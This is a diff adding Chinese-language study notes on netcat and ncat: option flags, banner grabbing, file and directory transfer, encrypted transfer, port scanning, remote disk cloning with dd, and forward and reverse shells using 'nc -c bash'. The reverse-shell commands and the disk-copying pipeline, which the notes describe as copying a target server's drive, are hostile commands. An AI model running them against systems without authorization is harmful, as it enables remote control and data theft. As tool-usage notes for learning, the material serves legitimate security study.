@@ -1,0 +1,67 @@
+1.netcat(nc) 
+
+-v 显示详细输出内容
+-n 跟IP地址，不进行DNS解析
+-l 打开一个listen端口
+-p 端口号
+-q n 当标准输出完成后延迟n秒断开
+-z 扫描模式，不做I/O操作
+
+(1)telnet/banner
+nc -vn ip地址 端口号
+	pop3(110)
+	smtp(25)
+	http(80)
+
+(2)传输文本信息
+sudo nc -l -p 333 (sudo netstat -pantu | grep 333)
+	可用于电子取证,直接传送，不在当前设备保存
+	如： 连接端：ls -l | nc -nv 10.1.1.12 333
+		 打开端：nc -l -p 333 > content.txt
+		 
+(3)传输文件/目录
+文件：
+	A: nc -lp 333 > 1/mp4
+	B: nc -nv 1.1.1.1 333 < 1.mp4 -q 1
+	或
+	A: nc -q 1 -lp 333 < a.mp4
+	B: nc -nv 1.1.1.1 333 > 2.mp4
+目录：
+	A: tar -cvf - music/ | nc -lp 333 -q 1
+	B: nc -nv 1.1.1.1 333 | tar -xvf -
+加密传文件：
+	A: nc -lp 333 | mcrypt --flush -Fbqd -a rijindael-256 -m ecb > 1.mp4
+	B: mcrypt --flush -Fbq -a rijindael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1
+
+(4)流媒体服务器
+	A: cat 1.mp4 | nc -lp 333
+	B: nc -vn 1.1.1.1 333 | mpalyer -vo x11 -cache 3000 -
+
+(5)端口扫描(扫描器的结果都不一定是正确的)
+	nc -nvz 1.1.1.1 1-65535
+	默认探测tcp端口，加上u选项探测udp端口
+	nc -vnzu 1.1.1.1 1-1024
+
+(6)远程克隆硬盘
+	A: nc -lp 333 | dd of=/dev/sda
+	B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1
+	远程电子取证，可以将目标服务器硬盘远程复制，或者内存
+	不仅是文件，每个磁道，包括已标记删除的信息,完整的硬盘复制
+
+(7)远程控制
+正向：
+	A: nc -lp 333 -c bash
+	B: nc 1.1.1.1 333
+反向：
+	A: nc -lp 333
+	B: nc 1.1.1.1 333 -c bash
+注： Windows用户把bash改成cmd
+
+2.ncat
+nc的缺点：
+	nc缺乏加密和身份验证的能力
+ncat包含于nmap工具包中
+--allow 允许连接的IP地址
+A: ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl(用ssl加密)
+B: ncat -nv 1.1.1.1 333 --ssl
+注：不同系统/平台的nv参数功能不尽相同
